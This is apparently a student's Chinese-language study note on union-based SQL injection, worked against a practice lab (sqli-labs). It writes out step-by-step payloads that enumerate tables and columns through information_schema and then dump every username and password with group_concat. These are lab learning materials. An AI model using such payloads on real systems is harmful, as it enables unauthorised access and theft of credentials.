## SQL注入基础方法之union注入





### 字符型union注入

###### 1.了解union注入过程中用到的关键数据库，数据表，数据列

###### 2.sql查询中  group_concat  的作用

###### 最终目标：使用union注入拿到靶机中数据库里的所以用户名和密码

###### 查询语句：  select 列名  +  from 表名  +  where  限定语句



##### 一.  拿到表名和列名

![Screenshot_20251221_154422_tv_danmaku_bili_UnitedBizDetailsActivity](D:\Huawei Share\Huawei Share\Screenshot_20251221_154422_tv_danmaku_bili_UnitedBizDetailsActivity.jpg)

重点了解 tables 和 columns ，这两张表被严格过滤。



##### 二.  查找数据库security中的表名（less-1用的是security，详情见上个mk）



##### 1.基本查询语句

根据上个mk里面的内容，先确定数字型还是字符型，之后找到闭合方式，order by 或者 group by 确定列数，union select 1,2,3....

 拿到回显，最后在有回显的地方使用函数database（）拿到数据库名称



##### 2.所需要表名信息 数据库information_schema --->  数据表tables --->  数据列table_name

命令： ?id=0' union select 1,2,table_name from information_schema.tables --+

这句话的意思就是我要在库里面查询别的表，所以用  information_schema .tables 获取所有的表名

![image-20251221160846832](C:\Users\HUAWEI\AppData\Roaming\Typora\typora-user-images\image-20251221160846832.png)



![image-20251221160907030](C:\Users\HUAWEI\AppData\Roaming\Typora\typora-user-images\image-20251221160907030.png)

我们可以看到页面只回显的一行信息，只回显了表名   CHARACTER_SETS

我们可以看到有很多表，但这些都不是我们想要的，我只想要当前数据库里面的表

![image-20251221161302841](C:\Users\HUAWEI\AppData\Roaming\Typora\typora-user-images\image-20251221161302841.png)

为了使信息更精确，只要当前数据库里面的表，我们可以完善语句：

 ?id=0' union select 1,2,table_name from information_schema.tables where table_schema=database() --+  

(这种方法比用 ‘security’  代替database（）好，因为后者可能会被系统识别为注入语句，而函数不会)

![3525645e8cc9f4c46c44340c22aaa350](C:\Users\HUAWEI\Documents\xwechat_files\wxid_mtx5ad017bjn22_5d30\temp\RWTemp\2025-12\9e20f478899dc29eb19741386f9343c8\3525645e8cc9f4c46c44340c22aaa350.png)

就能拿到表了，可是我们只能看到一个表，不能看到其他表，所以使用  group_concat()  把信息一行全部显示出来



构造命令

?id=0' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+  

![image-20251221162245570](C:\Users\HUAWEI\AppData\Roaming\Typora\typora-user-images\image-20251221162245570.png)

我们就能拿到当前数据库所有表名了





##### 三.  查找数据库security中数据表users的列名



###### 所需要信息在数据库  information_schema 数据表 columns 数据列 column_name

?id=0' union select 1,2,column_name from information_schema.columns --+

![image-20251221163510363](C:\Users\HUAWEI\AppData\Roaming\Typora\typora-user-images\image-20251221163510363.png)

![image-20251221163603884](C:\Users\HUAWEI\AppData\Roaming\Typora\typora-user-images\image-20251221163603884.png)

我们能看到，这样只显示第一行信息，并且有很多无用的信息



###### 过滤在security数据库中数据表user的列名

?id=0' union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() --+

![image-20251221164053198](C:\Users\HUAWEI\AppData\Roaming\Typora\typora-user-images\image-20251221164053198.png)

我们能看到很多信息，但我只想要表users里面的所有列名，所以增加and命令

?id=0' union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users' --+

![image-20251221164704956](C:\Users\HUAWEI\AppData\Roaming\Typora\typora-user-images\image-20251221164704956.png)

由此推断出所需列名应该为  username 和 password



###### 查询最终目标

###### 查询语句  ： select 列名 + from 表名 + where 限定语句

?id=0' union select 1,2,group_concat(username,'~',password) from users --+

![image-20251221165632865](C:\Users\HUAWEI\AppData\Roaming\Typora\typora-user-images\image-20251221165632865.png)









### 数字型union注入

复习：

1.确定是数字型还是字符型

2.用 group by 的二分法判断 union 语句中前一个查询的列数

3.优化语句，将id改为一个不存在的数据

4.使用select语句，查询靶机数据库库名

5..使用select语句，查询靶机所有表名

 6..使用select语句，查询靶机所有列名

7.查询所有用户名密码



###### 因为和前面的很相似，所以这里只给出解题的截图

![image-20251222142105241](C:\Users\HUAWEI\AppData\Roaming\Typora\typora-user-images\image-20251222142105241.png)

![image-20251222142301008](C:\Users\HUAWEI\AppData\Roaming\Typora\typora-user-images\image-20251222142301008.png)

![image-20251222143242414](C:\Users\HUAWEI\AppData\Roaming\Typora\typora-user-images\image-20251222143242414.png)

![image-20251222143446482](C:\Users\HUAWEI\AppData\Roaming\Typora\typora-user-images\image-20251222143446482.png)

![image-20251222143656531](C:\Users\HUAWEI\AppData\Roaming\Typora\typora-user-images\image-20251222143656531.png)





